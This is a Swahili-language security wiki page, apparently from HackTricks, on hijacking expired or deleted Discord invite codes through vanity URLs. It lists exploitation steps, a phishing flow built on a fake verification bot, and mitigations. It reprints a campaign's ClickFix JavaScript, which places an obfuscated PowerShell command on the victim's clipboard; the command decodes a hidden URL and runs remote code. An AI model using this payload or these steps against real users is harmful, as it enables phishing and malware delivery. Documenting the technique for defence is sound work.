# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking hutumia vibaya kanuni za utumiaji tena za vanity links maalum: invite code ya muda iliyo-expire, au code ya kudumu iliyofutwa inayoundwa tu na herufi ndogo na tarakimu, inaweza kusajiliwa kama vanity link kwenye server yenye Level 3 Boost. Vanity link maalum inaweza pia kupatikana wakati server yake ya awali inapoteza Level 3 Boost; kwa invite ya muda yenye herufi kubwa, mshambuliaji anaweza kusajili mapema vanity form yenye herufi ndogo huku invite ya kawaida ikiendelea kuwa active, lakini redirection huanza tu baada ya invite hiyo ku-expire.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Hatari iliyoonekana hutofautiana kulingana na aina ya invite:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Baada ya ku-expire, code hupatikana na inaweza kusajiliwa tena kama vanity URL na server yenye Boost. |
| Permanent Invite Link | ⚠️          | Ikiwa itafutwa na inajumuisha herufi ndogo na tarakimu pekee, code inaweza kupatikana tena.        |
| Custom Vanity Link    | ✅          | Ikiwa server ya awali itapoteza Level 3 Boost, vanity invite yake hupatikana kwa ajili ya usajili mpya.    |

## Exploitation Steps

1. Reconnaissance
- Fuatilia vyanzo vya umma (forums, social media, Telegram channels) kwa invite links zinazolingana na muundo `discord.gg/{code}` au `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Kusanya invite codes zinazovutia (za muda au vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
- Unda au tumia Discord server iliyopo yenye haki za Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Kwenye **Server Settings → Vanity URL**, jaribu kuassign target invite code. Ikikubaliwa, code inahifadhiwa na server hasidi.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Kwa invites za muda, subiri hadi invite ya awali i-expire (au ifute mwenyewe ikiwa unadhibiti source).<sup>[[1]](#references)</sup>
- Kwa codes zenye herufi kubwa, variant yenye herufi ndogo inaweza kudaiwa mara moja, ingawa redirection huanza tu baada ya expiration.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Watumiaji wanaotembelea link ya zamani hutumwa bila kutambua kwenye server inayodhibitiwa na mshambuliaji mara hijack inapoanza kufanya kazi.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Zuia channels za server ili channel ya **#verify** pekee ionekane.<sup>[[1]](#references)</sup>
2. Deploy bot (kwa mfano, **Safeguard#0786**) ili kuwaomba newcomers wathibitishe kupitia OAuth2.<sup>[[1]](#references)</sup>
3. Bot huwapeleka watumiaji kwenye phishing site (kwa mfano, `captchaguard.me`) kwa kisingizio cha CAPTCHA au hatua ya verification.<sup>[[1]](#references)</sup>
4. Tekeleza hila ya UX ya **ClickFix**:<sup>[[1]](#references)</sup>
- Onyesha ujumbe wa CAPTCHA iliyoharibika.
- Waelekeze watumiaji wafungue dialog ya **Win+R**, wapaste PowerShell command iliyopakiwa mapema, kisha wabonyeze Enter.

### ClickFix Clipboard Injection Example

Campaign ilitumia JavaScript kunakili PowerShell command hasidi kwenye clipboard:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Mbinu hii huepuka upakuaji wa faili moja kwa moja na hutumia vipengele vya UI vinavyojulikana ili kupunguza mashaka ya mtumiaji.<sup>[[1]](#references)</sup>

## Mitigations

- Pendelea invite links za kudumu na uhakikishe kuwa code ina angalau herufi moja kubwa; permanent codes zilizofutwa zenye herufi kubwa haziwezi kutumiwa tena kama vanity links.<sup>[[1]](#references)</sup>
- Badilisha invite codes mara kwa mara na ubatilishe links za zamani.
- Fuatilia hali ya Discord server boost na madai ya vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Waelimishe watumiaji kuthibitisha uhalali wa server na kuepuka kuendesha amri zilizobandikwa kutoka clipboard.

## References

- [1] [Kutoka Imani hadi Tishio: Discord Invites Zilizotekwa Zikitumika kwa Usambazaji wa Malware wa Hatua Nyingi](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
